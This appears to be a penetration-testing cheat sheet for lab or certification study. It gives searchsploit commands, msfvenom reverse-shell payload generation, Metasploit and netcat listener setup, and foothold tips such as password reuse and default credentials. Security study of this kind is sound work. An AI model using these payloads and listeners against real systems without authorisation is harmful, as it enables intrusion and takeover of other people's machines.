# 1. Finding Exploits
---

## Search for exploits

```
searchsploit keyword1 keyword2 keyword3
```
## Copy exploit

```
searchsploit -m [exploit database id]
```

If searchsploit fails to find any juicy exploits, try Google. If Google fails, well, thereâ€™s probably not a public exploit. TRY HARDER!
It may be exploitable with:
- Public POC (github, blog etc.)
	- Need to understand the code and POC
	- Try to write your own
- Bruteforcing
- Clear text password in files (need detail enumeration)

# 2. Customize Payloads
To open a Meterpreter session or a reverse shell so that you can take control of the victim box.

## MsfVenom

```
msfvenom -p [payload] -f [format] LHOST=[yourip] LPORT=[your listener port]
```
- staged - `windows/shell/reverse_tcp`
- unstaged - `windows/shell_reverse_tcp`
Other options: 
- `-e` to chose encoder
- `-b` allows you to set bad characters
List all payloads for msfvenom
```
msfvenom --list payloads
```

# 3. Privilege Escalation
- [Linux]()
- [Window]()
---
# 4. Catching reverse shells
Metasploit multi/handler listener
```
use exploit/multi/handler
msf exploit(multi/handler) > set payload windows/shell/reverse_tcp
msf exploit(multi/handler) > set lhost 192.168.1.109
msf exploit(multi/handler) > set lport 1234
msf exploit(multi/handler) > exploit
```
Netcat listener (unstaged payload)
```
root@kali:~# rlwrap nc -nvlp 80
nc: listening on :: 80 ...
nc: listening on 0.0.0.0 80 ...
```

# 5. Enumerate more
- Scan ports, scan all the ports, scan using different scanning techniques.
- Brute force web dirs, brute force web dirs using different wordlist and tools
- Check for file permissions, check for registry entries, check for writeable folders, check for privileged processes and services, check for interesting files...
- Look for a more suitable exploit using searchsploit, search google for valuable information, etc.
- Webserver version, web app version, CMS version, Plugin version...

## Tip for foothold
- Password reuse
- The default password for the application/ CMS
- Guess the file location incase of LFI with username
- Username from any notes inside the machine might be useful for Bruteforce
- Try harder doesn't mean you have to try the same exploit with 200x thread count. Be **smarter**.
